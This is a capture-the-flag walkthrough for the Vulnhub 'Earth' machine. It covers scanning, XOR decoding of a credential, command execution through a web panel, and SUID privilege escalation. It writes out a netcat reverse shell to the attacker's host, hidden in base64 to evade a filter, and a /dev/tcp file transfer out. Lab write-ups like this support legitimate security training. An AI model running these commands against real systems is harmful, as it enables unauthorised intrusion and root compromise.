Vulnhub - Earth Walkthrough

Youtube Video Walkthrough: https://www.youtube.com/watch?v=sifxfPzkA6A&list=PL_Bj4ZvhLa37QWivDC6chQTanrxqdjWrh&index=6

Lets start by finding the IP address of the vulnerable machine
$sudo arp-scan -l

$sudo nmap -sC -sV -T4 <ip_vulnerablemachine>
you will get three ports open 22, 80, 443

also you will be able to see two DNS entries - earth.local, terratest.earth.local

add these two to /etc/hosts
<ip_vulnerablemachine>	earth.local	terratest.earth.local

go to firefox, check earth.local
check the source code, you will not see much

do a gobuster scan
$gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt

you will see the folders
/admin

goto /admin
earth.local/admin

you will see username and password

check terratest.earth.local
run a gobuster scan on this one as well
$gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirn/common.txt

you will get 
/index.html
/robots.txt
/.htaccess
/.htpassword

you will find testingnotes open that

you will get the message, you will be able to use testdata.txt, check that

what you can do now, you can go to cyberchef

now take the message from earth.local

select hex, xor
add the key file, select utf-8
delimeter 0x

copy the message

you will be able to get the string pattern

login with the password with username terra

you will be able to run the commands in the browser
ls /var/earth_web/

check the user flag

take a reverse shell connection
$nc -lvnp 4444

use nc on the textbox

nc -e /bin/bash <ip_kalilinux> 4444

convert the command above to base 64 
$echo 'nc -e /bin/bash <ip_kalilinux 4444>'

now use the base64 value
'base64value' | base64 -d | bash

you will be able to establish the connection this time

spawn the shell
python -c 'import pty;pty.spawn("/bin/bash")'

$whoami

look at what commands can you run
$find / -perm -u=s 2>/dev/null

you can see reset_root, use that

reset_root
check the message

copy the file to the kali machine

listen to the kali machine
$nc -lvnp 3333 > reset_root

on vuln machine
cat /usr/bin/reset_root > /dev/tcp/<ip_kalilinux>/3333

$chmod +x reset_root

run an ltrace
$ltrace ./reset_root

you can create these files on the machine

go to the vuln machine
use touch to create those files

now if you run these files you will be able to use the password and get the root + root flag
